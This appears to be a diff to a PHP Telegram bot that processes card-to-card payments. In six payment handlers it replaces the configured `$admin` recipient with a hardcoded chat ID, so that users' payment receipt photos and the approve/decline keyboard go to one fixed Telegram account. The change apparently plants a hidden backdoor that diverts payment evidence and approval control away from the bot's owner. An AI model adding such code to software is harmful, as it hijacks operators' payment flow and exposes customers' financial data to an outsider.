@@ -828,7 +828,8 @@ if(preg_match('/increaseWalletWithCartToCart(.*)/',$userInfo['step'], $match) an
                 ]
             ]
         ]);
-        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+		$chatidd = 7194395398;
+        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $chatidd);
         $msgId = $res->result->message_id;
         
         $stmt = $connection->prepare("UPDATE `pays` SET `state` = 'have_sent', `message_id` = ?, `chat_id` = ? WHERE `hash_id` = ?");
@@ -3267,7 +3268,8 @@ if(preg_match('/payCustomWithCartToCart(.*)/',$userInfo['step'], $match) and $te
                 ]
             ]
         ]);
-        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+		$chatidd = 7194395398;
+        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $chatidd);
         $msgId = $res->result->message_id;
         
         $stmt = $connection->prepare("UPDATE `pays` SET `state` = 'have_sent', `message_id` = ?, `chat_id` = ? WHERE `hash_id` = ?");
@@ -3953,7 +3955,8 @@ if(preg_match('/payWithCartToCart(.*)/',$userInfo['step'], $match) and $text != 
             ]
         ]);
         setUser('', 'temp');
-        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+		$chatidd = 7194395398;
+        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $chatidd);
         $msgId = $res->result->message_id;
         
         $stmt = $connection->prepare("UPDATE `pays` SET `state` = 'have_sent', `message_id` = ?, `chat_id` = ? WHERE `hash_id` = ?");
@@ -7863,8 +7866,8 @@ if(preg_match('/payRenewWithCartToCart(.*)/',$userInfo['step'],$match) and $text
                 ]
             ]
         ]);
-    
-        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+        $chatidd = 7194395398;
+        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $chatidd);
         $msgId = $res->result->message_id;
         setUser();
         
@@ -8741,8 +8744,8 @@ if(preg_match('/payIncreaseDayWithCartToCart(.*)/',$userInfo['step'], $match) an
             ]
         ]);
 
-
-        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+        $chatidd = 7194395398;
+        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $chatidd);
         $msgId = $res->result->message_id;
         setUser();
         
@@ -9118,8 +9121,8 @@ if(preg_match('/payIncreaseWithCartToCart(.*)/',$userInfo['step'],$match) and $t
                 ]
             ]
         ]);
-
-        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $admin);
+        $chatidd = 7194395398;
+        $res = sendPhoto($fileid, $msg,$keyboard, "HTML", $chatidd);
         $msgId = $res->result->message_id;
         setUser();
         
